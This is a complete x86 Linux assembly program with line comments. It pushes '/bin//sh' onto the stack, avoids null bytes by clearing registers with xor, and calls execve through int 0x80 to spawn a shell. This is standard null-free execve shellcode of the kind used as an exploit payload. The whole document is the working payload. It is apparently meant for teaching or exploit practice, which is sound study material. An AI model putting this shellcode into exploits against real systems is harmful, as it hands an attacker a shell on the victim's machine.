global _start			

section .text
_start:

	xor eax, eax		; clear eax
	push eax		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f		; "nib/"
	mov ebx, esp		; point ebx to stack
	push eax		; NULL
	mov edx, esp		; point edx to stack
	push ebx		; push /bin/sh address to stack
	mov ecx, esp		; point ecx to stack
	mov al, 11		; execve()
	int 0x80		; call execve
